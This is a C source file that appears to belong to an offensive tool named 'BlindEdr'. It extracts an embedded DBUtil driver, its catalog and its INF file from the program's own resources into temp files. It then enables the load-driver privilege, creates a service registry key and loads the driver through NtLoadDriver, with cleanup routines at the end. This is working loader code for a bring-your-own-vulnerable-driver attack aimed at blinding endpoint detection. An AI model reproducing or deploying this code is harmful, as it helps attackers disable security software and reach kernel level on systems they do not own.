#include "DriverResourceLoader.h"
#include <stdio.h>
#include <stdlib.h>
#include <strsafe.h>
#include <shlobj.h>

// Resource type constants (must match RC file)
#define RT_DRIVER L"DRIVER"
#define RT_CATALOG L"CATALOG" 
#define RT_INF L"INF"

// Driver service names
#define DRIVER_SERVICE_NAME L"DBUtilDrv2"
#define DRIVER_DISPLAY_NAME L"DBUtil Driver 2"

// Driver registry path
#define DRIVER_REG_PATH L"System\\CurrentControlSet\\Services\\DBUtilDrv2"

static DriverResources g_driverResources = { 0 };

bool EnableLoadDriverPrivilege(void)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        printf("[-] OpenProcessToken failed: %lu\n", GetLastError());
        return false;
    }

    if (!LookupPrivilegeValueW(NULL, SE_LOAD_DRIVER_NAME, &luid))
    {
        printf("[-] LookupPrivilegeValue failed: %lu\n", GetLastError());
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
        printf("[-] AdjustTokenPrivileges failed: %lu\n", GetLastError());
        CloseHandle(hToken);
        return false;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        printf("[-] Privilege not assigned\n");
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    return true;
}

bool CreateUniqueTempFile(const wchar_t* prefix, const wchar_t* extension, wchar_t* outputPath, size_t maxLen)
{
    wchar_t tempPath[MAX_PATH];
    wchar_t guidStr[40];
    GUID guid;

    if (!GetTempPathW(MAX_PATH, tempPath))
    {
        printf("[-] GetTempPathW failed: %lu\n", GetLastError());
        return false;
    }

    if (CoCreateGuid(&guid) != S_OK)
    {
        printf("[-] CoCreateGuid failed\n");
        return false;
    }

    if (StringFromGUID2(guid, guidStr, 40) <= 0)
    {
        printf("[-] StringFromGUID2 failed\n");
        return false;
    }

    // Remove curly braces from GUID
    for (int i = 0; i < 40; i++)
    {
        if (guidStr[i] == L'{' || guidStr[i] == L'}')
            guidStr[i] = L'_';
    }

    if (StringCchPrintfW(outputPath, maxLen, L"%s%s_%s.%s", tempPath, prefix, guidStr, extension) != S_OK)
    {
        printf("[-] StringCchPrintfW failed\n");
        return false;
    }

    return true;
}

bool ExtractResourceToFile(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, const wchar_t* outputPath)
{
    HRSRC hResInfo;
    HGLOBAL hResData;
    LPVOID pResData;
    DWORD resSize;
    HANDLE hFile;
    DWORD dwWritten;

    hResInfo = FindResourceW(hModule, lpName, lpType);
    if (!hResInfo)
    {
        printf("[-] FindResourceW failed for type %ls, name %ls: %lu\n", lpType, lpName, GetLastError());
        return false;
    }

    resSize = SizeofResource(hModule, hResInfo);
    if (resSize == 0)
    {
        printf("[-] SizeofResource returned 0\n");
        return false;
    }

    hResData = LoadResource(hModule, hResInfo);
    if (!hResData)
    {
        printf("[-] LoadResource failed: %lu\n", GetLastError());
        return false;
    }

    pResData = LockResource(hResData);
    if (!pResData)
    {
        printf("[-] LockResource failed: %lu\n", GetLastError());
        return false;
    }

    hFile = CreateFileW(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateFileW failed for %ls: %lu\n", outputPath, GetLastError());
        return false;
    }

    if (!WriteFile(hFile, pResData, resSize, &dwWritten, NULL))
    {
        printf("[-] WriteFile failed: %lu\n", GetLastError());
        CloseHandle(hFile);
        return false;
    }

    CloseHandle(hFile);

    if (dwWritten != resSize)
    {
        printf("[-] Incomplete write: %lu/%lu bytes written\n", dwWritten, resSize);
        return false;
    }

    return true;
}

bool ExtractDriverResources(DriverResources* resources)
{
    HMODULE hModule;
    bool success = false;

    memset(resources, 0, sizeof(DriverResources));

    hModule = GetModuleHandleW(NULL);
    if (!hModule)
    {
        printf("[-] GetModuleHandleW failed: %lu\n", GetLastError());
        return false;
    }

    if (!CreateUniqueTempFile(L"dbutil", L"sys", resources->driverPath, MAX_PATH))
    {
        printf("[-] Failed to create temp driver path\n");
        return false;
    }

    if (!CreateUniqueTempFile(L"dbutil", L"cat", resources->catalogPath, MAX_PATH))
    {
        printf("[-] Failed to create temp catalog path\n");
        goto cleanup;
    }

    if (!CreateUniqueTempFile(L"dbutil", L"inf", resources->infPath, MAX_PATH))
    {
        printf("[-] Failed to create temp inf path\n");
        goto cleanup;
    }

    printf("[+] Extracting driver resources...\n");
    printf("    Driver: %ls\n", resources->driverPath);
    printf("    Catalog: %ls\n", resources->catalogPath);
    printf("    INF: %ls\n", resources->infPath);

    if (!ExtractResourceToFile(hModule, RT_DRIVER, MAKEINTRESOURCEW(IDR_DRIVER_DBUTIL), resources->driverPath))
    {
        printf("[-] Failed to extract driver file\n");
        goto cleanup;
    }
    printf("[+] Driver file extracted successfully\n");

    if (!ExtractResourceToFile(hModule, RT_CATALOG, MAKEINTRESOURCEW(IDR_CATALOG_DBUTIL), resources->catalogPath))
    {
        printf("[-] Failed to extract catalog file\n");
        goto cleanup;
    }
    printf("[+] Catalog file extracted successfully\n");

    if (!ExtractResourceToFile(hModule, RT_INF, MAKEINTRESOURCEW(IDR_INF_DBUTIL), resources->infPath))
    {
        printf("[-] Failed to extract INF file\n");
        goto cleanup;
    }
    printf("[+] INF file extracted successfully\n");

    success = true;
    goto end;

cleanup:
    if (resources->driverPath[0])
        DeleteFileW(resources->driverPath);
    if (resources->catalogPath[0])
        DeleteFileW(resources->catalogPath);
    if (resources->infPath[0])
        DeleteFileW(resources->infPath);

    memset(resources, 0, sizeof(DriverResources));

end:
    return success;
}

bool LoadDriverFromResources(const DriverResources* resources)
{
    typedef NTSTATUS(WINAPI* NtLoadDriverFunc)(PUNICODE_STRING DriverServiceName);
    HMODULE hNtdll;
    NtLoadDriverFunc pNtLoadDriver;
    UNICODE_STRING driverServiceName;
    WCHAR registryPath[MAX_PATH];
    NTSTATUS status;
    LONG regResult;
    HKEY hKey;

    if (!EnableLoadDriverPrivilege())
    {
        printf("[-] Failed to enable SeLoadDriverPrivilege\n");
        return false;
    }
    printf("[+] SeLoadDriverPrivilege enabled\n");

    // Create registry key for driver
    if (StringCchPrintfW(registryPath, MAX_PATH, L"%s", DRIVER_REG_PATH) != S_OK)
    {
        printf("[-] StringCchPrintfW failed\n");
        return false;
    }

    regResult = RegCreateKeyExW(HKEY_LOCAL_MACHINE, registryPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    if (regResult != ERROR_SUCCESS)
    {
        printf("[-] RegCreateKeyExW failed: %lu\n", regResult);
        return false;
    }

    // Set ImagePath value
    WCHAR imagePath[MAX_PATH];
    if (StringCchPrintfW(imagePath, MAX_PATH, L"\\??\\%s", resources->driverPath) != S_OK)
    {
        printf("[-] StringCchPrintfW failed for image path\n");
        RegCloseKey(hKey);
        return false;
    }

    regResult = RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ, (BYTE*)imagePath, (DWORD)((wcslen(imagePath) + 1) * sizeof(WCHAR)));
    if (regResult != ERROR_SUCCESS)
    {
        printf("[-] RegSetValueExW failed for ImagePath: %lu\n", regResult);
        RegCloseKey(hKey);
        return false;
    }

    // Set Type value (kernel driver)
    DWORD driverType = 1;
    regResult = RegSetValueExW(hKey, L"Type", 0, REG_DWORD, (BYTE*)&driverType, sizeof(DWORD));
    if (regResult != ERROR_SUCCESS)
    {
        printf("[-] RegSetValueExW failed for Type: %lu\n", regResult);
        RegCloseKey(hKey);
        return false;
    }

    // Set ErrorControl value
    DWORD errorControl = 1;
    regResult = RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&errorControl, sizeof(DWORD));
    if (regResult != ERROR_SUCCESS)
    {
        printf("[-] RegSetValueExW failed for ErrorControl: %lu\n", regResult);
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);

    // Load the driver
    hNtdll = LoadLibraryW(L"ntdll.dll");
    if (!hNtdll)
    {
        printf("[-] Failed to load ntdll.dll\n");
        return false;
    }

    pNtLoadDriver = (NtLoadDriverFunc)GetProcAddress(hNtdll, "NtLoadDriver");
    if (!pNtLoadDriver)
    {
        printf("[-] Failed to get NtLoadDriver address\n");
        FreeLibrary(hNtdll);
        return false;
    }

    if (StringCchPrintfW(registryPath, MAX_PATH, L"\\Registry\\Machine\\%s", DRIVER_REG_PATH) != S_OK)
    {
        printf("[-] StringCchPrintfW failed for service name\n");
        FreeLibrary(hNtdll);
        return false;
    }

    RtlInitUnicodeString(&driverServiceName, registryPath);
    status = pNtLoadDriver(&driverServiceName);

    FreeLibrary(hNtdll);

    if (status != 0 && status != 0xC0000034 /* Already loaded */)
    {
        printf("[-] NtLoadDriver failed with status: 0x%08X\n", status);
        return false;
    }

    if (status == 0xC0000034)
    {
        printf("[+] Driver was already loaded\n");
    }
    else
    {
        printf("[+] Driver loaded successfully\n");
    }

    return true;
}

bool UnloadDriver(const DriverResources* resources)
{
    typedef NTSTATUS(WINAPI* NtUnloadDriverFunc)(PUNICODE_STRING DriverServiceName);
    HMODULE hNtdll;
    NtUnloadDriverFunc pNtUnloadDriver;
    UNICODE_STRING driverServiceName;
    WCHAR registryPath[MAX_PATH];
    NTSTATUS status;

    hNtdll = LoadLibraryW(L"ntdll.dll");
    if (!hNtdll)
    {
        printf("[-] Failed to load ntdll.dll\n");
        return false;
    }

    pNtUnloadDriver = (NtUnloadDriverFunc)GetProcAddress(hNtdll, "NtUnloadDriver");
    if (!pNtUnloadDriver)
    {
        printf("[-] Failed to get NtUnloadDriver address\n");
        FreeLibrary(hNtdll);
        return false;
    }

    if (StringCchPrintfW(registryPath, MAX_PATH, L"\\Registry\\Machine\\%s", DRIVER_REG_PATH) != S_OK)
    {
        printf("[-] StringCchPrintfW failed for service name\n");
        FreeLibrary(hNtdll);
        return false;
    }

    RtlInitUnicodeString(&driverServiceName, registryPath);
    status = pNtUnloadDriver(&driverServiceName);

    FreeLibrary(hNtdll);

    if (status != 0 && status != 0xC0000034 /* Not loaded */)
    {
        printf("[-] NtUnloadDriver failed with status: 0x%08X\n", status);
        return false;
    }

    printf("[+] Driver unloaded successfully\n");
    return true;
}

void CleanupDriverResources(DriverResources* resources)
{
    if (resources->driverPath[0])
    {
        DeleteFileW(resources->driverPath);
        resources->driverPath[0] = L'\0';
    }

    if (resources->catalogPath[0])
    {
        DeleteFileW(resources->catalogPath);
        resources->catalogPath[0] = L'\0';
    }

    if (resources->infPath[0])
    {
        DeleteFileW(resources->infPath);
        resources->infPath[0] = L'\0';
    }

    resources->isLoaded = false;
}

// Simplified interface for BlindEdr app
bool InitializeDriverWithEmbeddedResources(void)
{
    if (!ExtractDriverResources(&g_driverResources))
    {
        printf("[-] Failed to extract driver resources\n");
        return false;
    }

    if (!LoadDriverFromResources(&g_driverResources))
    {
        printf("[-] Failed to load driver\n");
        CleanupDriverResources(&g_driverResources);
        return false;
    }

    g_driverResources.isLoaded = true;
    printf("[+] Driver initialized successfully\n");
    return true;
}

void CleanupEmbeddedDriver(void)
{
    if (g_driverResources.isLoaded)
    {
        UnloadDriver(&g_driverResources);
        g_driverResources.isLoaded = false;
    }

    CleanupDriverResources(&g_driverResources);
    printf("[+] Driver resources cleaned up\n");
}